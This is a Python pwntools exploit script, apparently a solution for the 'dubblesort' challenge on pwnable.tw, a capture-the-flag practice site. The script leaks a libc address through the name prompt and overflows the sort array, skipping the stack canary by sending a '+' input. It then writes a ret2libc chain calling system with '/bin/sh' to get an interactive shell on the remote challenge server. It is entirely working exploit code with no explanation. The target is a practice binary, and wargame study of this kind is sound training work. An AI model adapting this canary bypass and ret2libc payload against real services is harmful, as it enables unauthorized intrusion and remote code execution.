from pwn import *
context.log_level = "debug"
# p = process("./dubblesort")
p = remote("chall.pwnable.tw" , 10101)
elf = ELF("./dubblesort")
libc = ELF("./libc_32.so.6")

pading_size = 25
p.sendafter("What your name :" , "a" * pading_size)
p.recvuntil("a" * pading_size)

libc_base = u32(p.recv(3).rjust(4 , "\x00")) - 0x1b0000
system = libc_base + libc.sym["system"]
str_bin_sh = libc_base + libc.search("/bin/sh\x00").next()
p.sendlineafter("what to sort :" , str(35))
for i in range(24): # padding 0x50
	p.sendlineafter("number : " , str(0))
p.sendlineafter("number : " , "+") # canary
for i in range(7):
	p.sendlineafter("number : " , str(libc_base))
p.sendlineafter("number : " , str(system))
p.sendlineafter("number : " , str(str_bin_sh))
p.sendlineafter("number : " , str(str_bin_sh))

p.interactive()

